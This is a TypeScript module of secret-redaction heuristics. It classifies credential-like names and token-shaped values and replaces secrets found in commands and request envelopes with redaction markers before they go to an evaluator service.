  "scanning", "scanner", "detection", "mode", "list", "set", "map", "size", "bytes", "expiry",
  "expires", "expiration", "timeout", "exposure", "hash",
]);

function nameComponents(name: string): string[] {
  return name
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toLowerCase()
    .split(/[^a-z0-9]+/)
    .filter(Boolean);
}

/**
 * Whether an identifier's name says its value is a credential.
 *
 * `strong`: the value is a secret whatever it looks like (`DATABASE_PASSWORD`,
 * `client_secret`, `GITHUB_TOKEN`, `apiKey`). `weak`: only a value that ALSO
 * looks like a token counts (`STRIPE_KEY`, `sentry_dsn`). `null`: not a secret
 * name (`sort_key`, `max_tokens`, `SECRETS_DIR`, `PASSWORD_MIN_LENGTH`,
 * `NEXT_PUBLIC_API_KEY`).
 */
export function secretNameStrength(name: string): "strong" | "weak" | null {
  const bare = name.replace(/^[-"'\\]+|["'\\]+$/g, "");
  const comps = nameComponents(bare);
  if (comps.length === 0) return null;
  if (comps.some((c) => c === "public" || c === "publishable")) return null;
  const last = comps[comps.length - 1];
  const prev = comps.length > 1 ? comps[comps.length - 2] : undefined;
  if (STRONG_LAST_WORDS.has(last)) return "strong";
  if (last === "key" && prev && STRONG_KEY_QUALIFIERS.has(prev)) return "strong";
  if (prev && NOT_SECRET_QUALIFIERS.has(prev)) return null;
  if (last === "token") return "strong";
  // Run-together names the component split cannot see into: PGPASSWORD,
  // NPMTOKEN, GHTOKEN, MYAPIKEY.
  if (/(?:password|passwd|passphrase|secret|token|apikey)$/.test(last) && !NOT_SECRET_QUALIFIERS.has(last)) return "strong";
  if (comps.length === 1 && /^[A-Z0-9]{2,}KEY$/.test(bare)) return "strong"; // ORGKEY, DEPLOYKEY
  if (WEAK_LAST_WORDS.has(last) && (comps.length > 1 || /^[A-Z]+$/.test(bare))) {
    // An ENVIRONMENT-style name (`ADMIN_KEY`, `DEPLOY_KEY`) holds a credential
    // whatever its value looks like — `ADMIN_KEY="dev-admin-key"` is a live
    // login on a dev stack. The same word in code (`adminKey`) is too often a
    // lookup key to trust without a token-shaped value.
    return /^[A-Z][A-Z0-9_]*$/.test(bare) ? "strong" : "weak";
  }
  // A secret word earlier in the name, with a last word that still names the
  // value rather than describing it: Rails' SECRET_KEY_BASE.
  const earlier = comps.slice(0, -1);
  if (earlier.some((c) => c === "secret" || c === "password" || c === "passwd") && !META_SUFFIXES.has(last)) return "strong";
  return null;
}

/**
 * A linear pre-filter for the three name-driven scans: whether any name in
 * `text` could be a secret name at all.
 *
 * `secretNameStrength` says yes only to a name that holds one of its own words,
 * so a string holding none of them has nothing for those scans to find. The
 * list is derived from the sets above — a word added there is covered without
 * a second edit — and reduced to a minimal cover, because a name holding
 * `password` holds `pass` too.
 *
 * It is also three passes saved on every string that holds no such word, which
 * is most of them. It is NOT what makes those scans linear — a run that does
 * hold one of these words (`a=key=a=key=…`) skips nothing, and 910 ms of one
 * envelope was exactly that shape. `ASSIGNMENT_NAME_RE` and `literalValue`
 * are what fixed the cost.
 */
const SECRET_NAME_HINTS: ReadonlyArray<string> = (() => {
  const words = [...new Set([...STRONG_LAST_WORDS, ...WEAK_LAST_WORDS, "token", "code"])];
  return words.filter((w) => !words.some((other) => other !== w && w.includes(other)));
})();

function mayHoldSecretName(text: string): boolean {
  const lower = text.toLowerCase();
  for (const word of SECRET_NAME_HINTS) if (lower.includes(word)) return true;
  return false;
}

// ── Value shapes ─────────────────────────────────────────────────────────────

const NON_VALUE_WORDS = new Set(["true", "false", "null", "none", "nil", "undefined", "yes", "no", "on", "off"]);
const TYPED_ARRAY_RE = /^(?:Big)?(?:Uint|Int)\d+Array$|^Float\d+Array$|^Uint8ClampedArray$/;
/** Type names and schema words that follow `NAME: ` in code and config, not a value. */
const TYPE_WORDS = new Set([
  "str", "string", "int", "integer", "number", "float", "double", "bool", "boolean", "bytes", "any",
  "unknown", "object", "optional", "secretstr", "secretbytes", "union", "list", "dict", "map", "array",
  "text", "char", "varchar", "required",
]);

/** `$VAR`, `${VAR}`, `` `cmd` ``, `{expr}`, `(expr)`, `<placeholder>`, `[list]`, `%VAR%`. */
const REFERENCE_START_RE = /^[$`{(<[%]/;

/** True for a string that could be a literal value rather than a reference, a path or a keyword. */
function isLiteral(value: string): boolean {
  if (!value) return false;
  if (REFERENCE_START_RE.test(value)) return false;
  if (/^(?:\/|\.\.?\/|~\/|~$|[A-Za-z]:\\)/.test(value)) return false; // a path names where a secret is, not the secret
  if (NON_VALUE_WORDS.has(value.toLowerCase())) return false;
  if (/^[*x•.#-]+$/i.test(value)) return false; // already masked
  return true;
}

/** Fraction of adjacent characters that change class (lower/upper/digit/other). */
function classSwitchRate(s: string): number {
  const cls = (c: string): number => (c >= "a" && c <= "z" ? 0 : c >= "A" && c <= "Z" ? 1 : c >= "0" && c <= "9" ? 2 : 3);
  let switches = 0;
  for (let i = 1; i < s.length; i++) if (cls(s[i]) !== cls(s[i - 1])) switches++;
  return s.length > 1 ? switches / (s.length - 1) : 0;
}

/**
 * Looks like a generated token rather than a word, a name or a phrase: it has a
 * digit, a lower→upper case hump (`aBcD`, not the capital of `Bearer`), or a
 * symbol a word does not carry.
 */
function tokenLike(value: string): boolean {
  if (/\s/.test(value)) return false;
  if (/^[a-z]+(?:[-_.][a-z]+)*$/.test(value)) return false; // app-settings, created_at
  if (/^[A-Z]+(?:_[A-Z0-9]+)*$/.test(value) && !/\d/.test(value)) return false; // OTHER_VAR_NAME
  return /\d/.test(value) || /[a-z][A-Z]/.test(value) || /[^A-Za-z0-9_.-]/.test(value);
}

/** A shell-quoted argument split into its quote character and its bare value. */
function unquote(arg: string): [quote: string, value: string] {
  const m = /^(["'])([\s\S]*)\1$/.exec(arg);
  return m ? [m[1], m[2]] : ["", arg];
}

/**
 * An unquoted value after `: ` or ` = ` in code is usually an expression, not a
 * literal: `token: string`, `password: hashedPassword`, `apiKey: config.apiKey`,
 * `secret: Uint8Array`. Those stay; `password: hunter2` does not. A long run of
 * letters that switches case like a random string does is kept as a secret too.
 */
function looksLikeExpression(value: string): boolean {
  if (TYPED_ARRAY_RE.test(value)) return true;
  if (/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)+[?!]?$/.test(value)) return true; // member access
  if (/^[A-Za-z_$][A-Za-z_$]*[?!]?$/.test(value)) {
    return !(value.length >= 16 && classSwitchRate(value) >= 0.3);
  }
  return false;
}

/**
 * Whether an assignment's value is a secret, given how strongly its name says so.
 *
 * `spaced` is true for `: ` / ` = ` separators, where an unquoted value is more
 * often an expression than a literal; `urlQuery` for `?name=` / `&name=`, where
 * even a bare `key=` or `sig=` is a credential.
 */
function assignmentValueIsSecret(
  name: string,
  value: string,
  opts: { quoted: boolean; spaced: boolean; urlQuery: boolean; flag?: boolean; colon?: boolean },
): boolean {
  let strength = secretNameStrength(name);
  if (!strength && opts.urlQuery && /^(?:key|sig|auth|code|access_token|client_secret)$/i.test(name)) strength = "weak";
  if (!strength) return false;
  if (!isLiteral(value)) return false;
  const bare = name.replace(/^[-"'\\]+|["'\\]+$/g, "");
  if (value.toLowerCase() === bare.toLowerCase()) return false; // f(api_key=api_key), "password": "Password"
  // A "quoted value" that starts with a delimiter is the tail of a string the
  // name sat inside: `print('has_key=', …)` quotes `, …` up to the next quote.
  if (opts.quoted && /^[,;)\]}\s]/.test(value)) return false;
  const envStyle = /^[A-Z][A-Z0-9_]*$/.test(bare);
  if (!opts.quoted) {
    // YAML has no expressions, so `POSTGRES_PASSWORD: changeme` under an
    // environment-style name is a literal. A type annotation on the same name
    // (`DB_PASSWORD: string`, `SECRET_KEY: str`), a camelCase variable
    // (`{ DB_PASSWORD: dbPassword }`) and member access (`API_TOKEN:
    // process.env.X`) are still code.
    const yamlLiteral =
      opts.colon === true && envStyle && /^[A-Za-z]+$/.test(value) && !/[a-z][A-Z]/.test(value) && !TYPE_WORDS.has(value.toLowerCase());
    if (opts.spaced && looksLikeExpression(value) && !yamlLiteral) return false;
    if (!opts.spaced) {
      if (/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)+$/.test(value) && !/\d/.test(value)) return false; // token=self.token
      // `authToken=userAuthTokenValue` in code is a variable, not a secret; an
      // environment-style name (`PASSWORD=letmein`) keeps any literal, and so
      // does a command-line flag (`mysql --password=letmein`): a shell has no
      // variables without a `$`.
      if (!envStyle && !name.startsWith("-") && /^[A-Za-z_$][A-Za-z_$]*$/.test(value) && classSwitchRate(value) < 0.45) return false;
    }
  }
  if (opts.flag) return value.length >= (strength === "strong" ? 6 : 8) && tokenLike(value);
  if (strength === "strong") return value.length >= 3;
  return value.length >= 8 && tokenLike(value);
}

/**
 * Whether `value`, found under the key `name` in structured input (an MCP
 * tool's arguments, a JSON body), is a secret. The value is a literal string
 * by construction, so only its name and its shape decide.
 */
export function isSecretFieldValue(name: string, value: string): boolean {
  return assignmentValueIsSecret(name, value, { quoted: true, spaced: false, urlQuery: false });
}

/**
 * The value of a credential header in STRUCTURED input — `{"headers":
 * {"Authorization": "Basic …"}}` from an HTTP-calling MCP tool, where the
 * name arrives as an object key rather than in the text.
 *
 * Same blunt rule as the text path, and the same reason: the NAME decides, the
 * value is never classified. Whatever sits under `Authorization`, `x-api-key`
 * or `Cookie` is replaced whole — a known scheme, an unknown one, a reference
 * (`Bearer $TOKEN`), a bare scheme word, prose. Three rounds were spent asking
 * whether the first word was a scheme, whether the value read like prose and
 * whether it was reference-shaped, and each of those questions sent a live
 * credential to Jev at least once: a 25-character `sk-` key passes for a
 * scheme, `Hawk`/`NTLM`/`Splunk` pass for prose, and this value never goes
 * through `redactSecrets`, so anything kept here is sent as it stands.
 *
 * Returns the marker and the credential copies it removed, or null when the
 * field is not a credential header or its value is blank. `secrets` is what
 * `scrubKnownSecrets` looks for in the rest of the envelope, so it holds the
 * BARE credential rather than the whole value: `{"Authorization": "Bearer
 * <tok>"}` reporting `Bearer <tok>` matched no copy of `<tok>` anywhere, and
 * the copy the human had pasted into their message went out to Jev. The same
 * `credentialCopies` as the text path, so a value that is already a marker
 * reports nothing and a value that is prose reports nothing either.
 */
export function redactAuthorizationField(name: string, value: string): { text: string; secrets: string[] } | null {
  const field = name.trim();
  if (!CREDENTIAL_FIELD_RE.test(field)) return null;
  const v = value.trim();
  if (!v) return null;
  return { text: marker(credentialHeaderLabel(field)), secrets: credentialCopies(v, headerHasScheme(field)) };
}

/**
 * A long token that looks generated: at least 32 characters, all three of
 * lower case, upper case and digits, and a character class that changes as
 * often as a random string's does. A random base64url token switches class at
 * ~64% of positions; camelCase identifiers, even long ones with a digit, switch
 * at a word boundary and sit well under half. Hex digests (git SHAs, sha256
 * sums, UUIDs) are single-case and never qualify, which is deliberate: they are
 * everywhere in real commands and almost never secret.
 *
 * Two more exclusions came from measuring real transcripts: a token that is
 * mostly digits and separators (`2026-08-31T10_22_33_123Z-debug-0`, an npm log
 * name) and a token built from words (`Offchain_Labs_whitepaper-2024-…`, a
 * docs asset with a hash suffix). A random token has letters in ~80% of its
 * positions and almost never a whole separator-delimited segment that is a word.
 */
export function looksRandomToken(t: string): boolean {
  if (t.length < 32) return false;
  if (/^(?:sha(?:1|224|256|384|512)|md5)[-_]/i.test(t)) return false;
  const upper = t.replace(/[^A-Z]/g, "").length;
  const lower = t.replace(/[^a-z]/g, "").length;
  if (upper < 3 || lower < 3 || !/[0-9]/.test(t)) return false;
  if ((upper + lower) / t.length < 0.5) return false;
  if (t.split(/[-_]/).some((seg) => /^[A-Z]?[a-z]{3,}$/.test(seg) || /^[A-Z]{4,}$/.test(seg))) return false;
  return classSwitchRate(t) >= 0.45;
}

/**
 * True when the token at `offset` is part of a spelled-out digest —
 * `sha512-<base64>` (an npm integrity field, whose `+` and `/` split it into
 * several random-looking tokens) or `sha256=<base64>` (a wheel's RECORD). A
 * hash is not a secret, and these are everywhere in lockfiles.
 */
function insideDigest(whole: string, offset: number): boolean {
  let start = offset;
  const floor = Math.max(0, offset - 200);
  while (start > floor && /[A-Za-z0-9+/=_:-]/.test(whole[start - 1])) start--;
  return /^(?:sha(?:1|224|256|384|512)|md5)[-=:]/i.test(whole.slice(start, start + 8));
}

// ── This machine's own secrets ───────────────────────────────────────────────

let envSecretSource: Record<string, string | undefined> | null = null;
let envSecretCache: ReadonlyArray<readonly [string, string]> | null = null;

/**
 * The values of this process's secret-named environment variables, as exact
 * strings, longest first. An exact match is the one redaction with no false
 * positives, and it catches every secret shape no pattern knows — a Datadog
 * key is 32 hex characters, indistinguishable from a digest by shape alone.
 */
function envSecrets(): ReadonlyArray<readonly [string, string]> {
  if (envSecretCache) return envSecretCache;
  const env = envSecretSource ?? (process.env as Record<string, string | undefined>);
  const found: Array<readonly [string, string]> = [];
  for (const [name, value] of Object.entries(env)) {
    if (typeof value !== "string" || value.length < 12 || value.length > 4096) continue;
    if (!secretNameStrength(name) || !isLiteral(value) || !tokenLike(value)) continue;
    found.push([value, name]);
  }
  found.sort((a, b) => b[0].length - a[0].length);
  envSecretCache = found;
  return found;
}

/**
 * Replace the environment the literal-secret rule reads (tests), or restore the
 * real one with `null`. Clears the cache either way.
 */
export function setEnvSecretSource(env: Record<string, string | undefined> | null): void {
  envSecretSource = env;
  envSecretCache = null;
}

// ── The redactor ─────────────────────────────────────────────────────────────

type Groups = string[];

/**
 * A global replace whose callback may DECLINE a match (return null), counting
 * the replacements it makes.
 *
 * A declined match gives back all but its first character. `String.replace`
 * would resume scanning after it, and a declined match can contain the very
 * thing a rule is looking for: `raw = 'AWS_SECRET_ACCESS_KEY=wJalr…'` is first
 * seen as the assignment `raw = '…'`, declined because `raw` is no secret name,
 * and the secret-named assignment INSIDE its value was never looked at. A
 * rule whose declined match cannot hide a nested candidate — a token run, a
 * vendor prefix inside a longer word — passes `onDecline: "skip"` and resumes
 * after it instead.
 */
function replaceCounting(
  text: string,
  re: RegExp,
  fn: (match: string, groups: Groups, offset: number, whole: string) => string | null,
  counter: { n: number; found: string[] },
  onDecline: "rescan" | "skip" = "rescan",
): string {
  re.lastIndex = 0;
  let out = "";
  let last = 0;
  for (let m = re.exec(text); m !== null; m = re.exec(text)) {
    const groups = m.slice(1).map((g) => g ?? "");
    const replacement = m[0].length > 0 ? fn(m[0], groups, m.index, text) : null;
    if (replacement === null) {
      re.lastIndex = onDecline === "skip" && m[0].length > 0 ? m.index + m[0].length : m.index + 1;
      continue;
    }
    out += text.slice(last, m.index) + replacement;
    last = m.index + m[0].length;
    counter.n++;
    counter.found.push(replacedPart(m[0], replacement));
  }
  re.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * The part of `match` a replacement removed: what lies between their common
 * prefix and suffix. It is what `scrubKnownSecrets` then looks for elsewhere
 * in the envelope, so a rule has to put back everything around the secret that
 * was not the secret — a QUOTE above all. A rule that dropped a quoted value
 * whole recorded `'hunter2'`, which appears nowhere else, and the bare copy in
 * the agent's own description went out with the request.
 */
function replacedPart(match: string, replacement: string): string {
  let p = 0;
  while (p < match.length && p < replacement.length && match[p] === replacement[p]) p++;
  let s = 0;
  while (s < match.length - p && s < replacement.length - p && match[match.length - 1 - s] === replacement[replacement.length - 1 - s]) s++;
  return match.slice(p, match.length - s);
}

/**
 * Replace every copy of an already-found secret. A secret is only RECOGNISED
 * where its context gives it away (`aws_secret_access_key <value>`), but the
 * same bytes can travel on without that context — the path facts lift bare
 * tokens out of the command, a human pastes the value into a message. Only
 * values distinctive enough to scrub blindly are used: 16+ characters, or 8+
 * that look like a token. Longest first, as for the environment's values: a
 * shorter secret that is a prefix of a longer one would otherwise split the
 * longer one's copy and leave its tail behind.
 */
export function scrubKnownSecrets(text: string, known: Iterable<string>): Redacted {
  let out = text;
  let count = 0;
  for (const secret of [...known].sort((a, b) => b.length - a.length)) {
    if (!(secret.length >= 16 || (secret.length >= 8 && tokenLike(secret))) || !out.includes(secret)) continue;
    const parts = out.split(secret);
    count += parts.length - 1;
    out = parts.join(marker("repeated secret"));
  }
  return { text: out, count };
}

export interface RedactOptions {
  /**
   * Whether the two BLUNT rules run: a credential header's whole value
   * (`redactCredentialHeaders`) and a credential flag's whole argument
   * (`redactCredentialArguments`).
   *
   * They exist for the ENVELOPE, the one place where over-redaction costs Jev
   * a little context it almost never needs and a miss hands a third party a
   * live key. Everywhere else that trade does not hold, because nothing leaves
   * the machine: the human's own prompt, stored for `readUserIntent`, used to
   * come back with everything after a `cookie:` or an `authorization:` cut out
   * of it — which is the evaluator's own record of what the user asked for.
   * So this defaults to on for `buildEnvelope`, and callers outside the
   * request body pass `false` and keep the narrow rules only (the shared
   * floor, vendor prefixes, PEM blocks, URL credentials, secret-named
   * assignments and flags, high-entropy tokens).
   */
  blunt?: boolean;
}

/**
 * Redact every secret in `text`, replacing each with a `<redacted:label>`
 * marker and counting them.
 *
 * Rules run from the most exact to the most heuristic, so the most specific
 * label wins and later rules never re-match an earlier marker (a value that
 * starts with `<` is never a literal).
 */
export function redactSecrets(text: string, opts: RedactOptions = {}): Redacted {
  const { text: out, count } = redactSecretsDetailed(text, opts);
  return { text: out, count };
}

/** `redactSecrets`, plus the literal secrets it replaced. */
export function redactSecretsDetailed(text: string, opts: RedactOptions = {}): RedactedDetail {
  if (!text) return { text, count: 0, found: [] };
  const blunt = opts.blunt !== false;
  const c = { n: 0, found: [] as string[] };
  let out = text;

  // 1. Exact values of this machine's secret-named environment variables.
  for (const [value, name] of envSecrets()) {
    if (!out.includes(value)) continue;
    const parts = out.split(value);
    c.n += parts.length - 1;
    c.found.push(value);
    out = parts.join(marker(`value of $${name}`));
  }

  // 2. Whole PEM blocks, before the shared rule eats just the header; then
  //    the lines in front of a footer whose header was cut away.
  out = redactPemBlocks(out, c);
  out = redactOrphanFooters(out, c);

  // 3. The shared floor.
  for (const [re, label, keepsPrefix] of SHARED_RULES) {
    const before = c.found.length;
    out = replaceCounting(out, re, (_m, g) => (keepsPrefix ? (g[0] ?? "") : "") + marker(label), c);
    // A floor entry that takes the header NAME along with the value —
    // `Authorization: Bearer <tok>` is one match — reports the whole match as
    // the secret, and that string matches no copy of the credential anywhere
    // else in the envelope, so the copy the human pasted went out. Report the
    // credential inside it too, under the same rule as every other region.
    const end = c.found.length;
    for (let i = before; i < end; i++) {
      if (!/\s/.test(c.found[i])) continue;
      for (const copy of credentialCopies(c.found[i], true)) if (!c.found.includes(copy)) c.found.push(copy);
    }
  }

  // 4. Vendor prefixes and webhook URLs.
  for (const [re, label] of VENDOR_RULES) {
    out = replaceCounting(out, re, (_m, _g, offset, whole) => (atTokenBoundary(whole, offset) ? marker(label) : null), c, "skip");
  }
  for (const [re, label] of WEBHOOK_RULES) out = replaceCounting(out, re, (_m, g) => g[0] + marker(label), c);

  // 5. Credentials in URLs and HTTP auth.
  // Both URL rules need a `://` to match at all, and the check is one pass
  // against two scans of every string the envelope sends.
  if (out.includes("://")) {
    out = replaceCounting(
      out,
      URL_CREDENTIALS_RE,
      (_m, g) => (isLiteral(g[3]) ? `${g[0]}${g[1]}${g[2]}:${marker("URL credentials")}@` : null),
      c,
    );
    out = replaceCounting(out, URL_TOKEN_USERINFO_RE, (_m, g) => (tokenLike(g[2]) ? `${g[0]}${g[1]}${marker("URL credentials")}@` : null), c);
  }
  if (blunt) out = redactCredentialHeaders(out, c);
  out = replaceCounting(
    out,
    BEARER_RE,
    // A compound id (`dev-admin-key`) counts too: prose puts a word after
    // "bearer", not a hyphenated identifier — except `token-based` and kin.
    (_m, g) =>
      tokenLike(g[1]) || (/^[a-z0-9]+(?:[-_][a-z0-9]+)+$/.test(g[1]) && !/^tokens?[-_]/.test(g[1]))
        ? `${g[0]}${marker("bearer token")}`
        : null,
    c,
  );

  // 6. Credentials passed positionally, or behind a flag that names one.
  // The quotes around a value are re-emitted around the marker rather than
  // dropped with it: the replaced command stays quoted as it was written, and
  // the secret these rules hand to the scrub pass is the BARE value, which is
  // the form its copies elsewhere in the envelope are in.
  if (blunt) out = redactCredentialArguments(out, c);

  out = redactNamedSecrets(out, c);

  // 8. Anything left that looks generated.
  out = replaceCounting(
    out,
    LONG_TOKEN_RE,
    (m, _g, offset, whole) => (looksRandomToken(m) && !insideDigest(whole, offset) ? marker("high-entropy token") : null),
    c,
    "skip",
  );

  return { text: out, count: c.n, found: c.found };
}

/**
 * The three name-driven scans: `config set <name> <value>`, every syntax of
 * `NAME=value`, and `--flag value`.
 *
 * Skipped whole for a string that holds no secret-name word, which is one pass
 * against three (see `SECRET_NAME_HINTS`). The two name-and-value scans walk
 * their value in code, so a delimiter-free run costs its length and not its
 * square.
 */
function redactNamedSecrets(text: string, c: { n: number; found: string[] }): string {
  if (!mayHoldSecretName(text)) return text;
  let out = text;
  out = replaceCounting(
    out,
    CONFIG_SET_RE,
    // The NAME decides, as it does for a credential flag: `aws configure set
    // aws_secret_access_key swordfish` is a credential although nothing about
    // the value says so. Only a value already replaced is left alone.
    (_m, g) => {
      const [quote, value] = unquote(g[3]);
      return secretNameStrength(g[1]) !== null && withoutMarkers(value).trim() !== ""
        ? `${g[0]}${g[1]}${g[2]}${quote}${marker("assigned secret")}${quote}`
        : null;
    },
    c,
  );

  // 7. Assignments whose name says the value is a secret, and secret-named
  //    flags with a separate value. Both walk the value in code.
  out = redactNameValue(out, ASSIGNMENT_NAME_RE, c, (text, m, value) => {
    const [, boundary, , name, , sep] = m;
    // `${NAME:-default}` / `${NAME:=default}`: the default is the value, and a
    // default that is itself `$OTHER` is a reference, not a literal.
    const dollarBrace = boundary === "{" && m.index > 0 && text[m.index - 1] === "$" && sep === ":";
    const quoted = value.quote !== "";
    const v = !quoted && dollarBrace ? value.text.replace(/^[-=+?]/, "") : value.text;
    const urlQuery = boundary === "?" || boundary === "&";
    const colon = sep.trim() === ":";
    return assignmentValueIsSecret(name, v, { quoted, spaced: colon || /\s/.test(sep), urlQuery, colon });
  });
  // The boundary group rules out `x--token` and the `-b` of `a-b c`.
  out = redactNameValue(out, FLAG_NAME_RE, c, (_text, m, value) =>
    assignmentValueIsSecret(m[2], value.text, { quoted: value.quote !== "", spaced: true, urlQuery: false, flag: true }),
  );
  return out;
}

/**
 * One scan of `re` — a NAME and its separator — with the value that follows
 * walked in code and replaced when `isSecret` says so.
 *
 * Linear in the length of the text whatever it holds: each match is O(1) after
 * the boundary group, and `literalValue`'s cursor visits each character of a
 * value about once.
 *
 * A DECLINED match gives back all but its first character, as the old
 * `replaceCounting` did, because a candidate can start INSIDE one: in
 * `let parsed: FileCredentials = …` the first match is `parsed:` and the
 * secret-named assignment begins in the middle of what it consumed. Resuming
 * after the separator instead lost it. Only the name and the separator are
 * given back — never a value — so the give-back is bounded by the name, and
 * the names it walks again are disjoint.
 */
function redactNameValue(
  text: string,
  re: RegExp,
  c: { n: number; found: string[] },
  isSecret: (text: string, m: RegExpExecArray, value: { quote: string; text: string }) => boolean,
): string {
  const escapedQuote = re === ASSIGNMENT_NAME_RE;
  const stop = { from: 0, at: -1 };
  let out = "";
  let last = 0;
  re.lastIndex = 0;
  for (let m = re.exec(text); m !== null; m = re.exec(text)) {
    if (m.index < last) {
      re.lastIndex = Math.max(re.lastIndex, last);
      continue;
    }
    const at = m.index + m[0].length;
    const v = literalValue(text, at, { escapedQuote, leadingDash: escapedQuote, stop });
    if (v === null || !isSecret(text, m, { quote: v.quote, text: text.slice(v.from, v.to) })) {
      re.lastIndex = m.index + 1;
      continue;
    }
    const value = text.slice(v.from, v.to);
    out += text.slice(last, v.from) + marker("assigned secret");
    c.n++;
    c.found.push(value);
    last = v.to;
    re.lastIndex = v.to;
  }
  re.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}
